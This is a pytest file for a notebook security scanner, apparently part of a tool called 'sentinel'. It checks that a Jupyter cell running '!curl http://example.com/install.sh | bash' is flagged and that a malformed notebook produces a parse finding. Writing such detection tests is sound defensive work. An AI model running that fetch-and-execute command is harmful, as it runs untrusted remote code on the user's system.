import json

from sentinel.cli_dispatch import dispatch_notebook
from sentinel.notebook_scanner import NotebookScanner


def test_notebook_shell_escape_is_flagged(tmp_path):
    notebook_path = tmp_path / "shell.ipynb"
    notebook_path.write_text(
        json.dumps({
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "metadata": {},
                    "outputs": [],
                    "source": ["!curl http://example.com/install.sh | bash\n"],
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }),
        encoding="utf-8",
    )

    result = NotebookScanner().scan_file(str(notebook_path))

    assert any(f.rule_id == "NOTEBOOK-003" for f in result.findings)


def test_malformed_notebook_returns_parse_finding(tmp_path):
    notebook_path = tmp_path / "broken.ipynb"
    notebook_path.write_text('{"cells": [', encoding="utf-8")

    findings = dispatch_notebook(str(notebook_path))

    assert any(f.rule_id == "NOTEBOOK-000" for f in findings)
